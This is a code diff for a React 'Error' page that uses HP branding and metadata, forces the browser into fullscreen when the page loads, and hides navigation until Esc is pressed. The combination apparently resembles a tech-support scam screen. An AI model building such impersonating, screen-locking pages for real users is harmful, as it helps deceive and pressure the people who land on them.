@@ -5,15 +5,15 @@ import { bigimage, hplogo } from "../../assets/images";
 const Error = () => {
   const [showNavigation, setShowNavigation] = useState(false);
 
-  // Function to handle "Esc" key press event
-  const handleEscKeyPress = (event) => {
-    if (event.keyCode === 27) {
-      // "Esc" key is pressed
-      setShowNavigation(!showNavigation); // Toggle navigation visibility
-    }
-  };
-
   useEffect(() => {
+    // Function to handle "Esc" key press event
+    const handleEscKeyPress = (event) => {
+      if (event.keyCode === 27) {
+        // "Esc" key is pressed
+        setShowNavigation(!showNavigation); // Toggle navigation visibility
+      }
+    };
+
     // Add event listener for "Esc" key press
     document.addEventListener("keydown", handleEscKeyPress);
 
@@ -22,6 +22,37 @@ const Error = () => {
       document.removeEventListener("keydown", handleEscKeyPress);
     };
   }, [showNavigation]); // Re-run effect whenever showNavigation state changes
+
+  useEffect(() => {
+    // Enter fullscreen mode when component mounts
+    const enterFullscreen = () => {
+      const element = document.documentElement;
+      if (element.requestFullscreen) {
+        element.requestFullscreen();
+      } else if (element.mozRequestFullScreen) {
+        element.mozRequestFullScreen();
+      } else if (element.webkitRequestFullscreen) {
+        element.webkitRequestFullscreen();
+      } else if (element.msRequestFullscreen) {
+        element.msRequestFullscreen();
+      }
+    };
+
+    enterFullscreen();
+
+    // Exit fullscreen mode when component unmounts
+    return () => {
+      if (document.exitFullscreen) {
+        document.exitFullscreen();
+      } else if (document.mozCancelFullScreen) {
+        document.mozCancelFullScreen();
+      } else if (document.webkitExitFullscreen) {
+        document.webkitExitFullscreen();
+      } else if (document.msExitFullscreen) {
+        document.msExitFullscreen();
+      }
+    };
+  }, []);
 
   return (
     <html country="GB" lang="en" dir="ltr">
@@ -47,17 +78,12 @@ const Error = () => {
         <meta content=" R11849 " name="web_section_id" />
         <meta content="True" name="HandheldFriendly" />
         <meta content="width=device-width, initial-scale=1.0" name="viewport" />
-
-        <style>
-          {`
-            .header-123 .header-menu {
-              display: ${showNavigation ? "block" : "none"};
-            }
-          `}
-        </style>
       </head>
       <body>
-        <div className="header-123" id="header-123">
+        <div
+          className={`header-123 ${showNavigation ? "" : "hide-navigation"}`}
+          id="header-123"
+        >
           <div className="header-container">
             <div className="hp-logo">
               <a
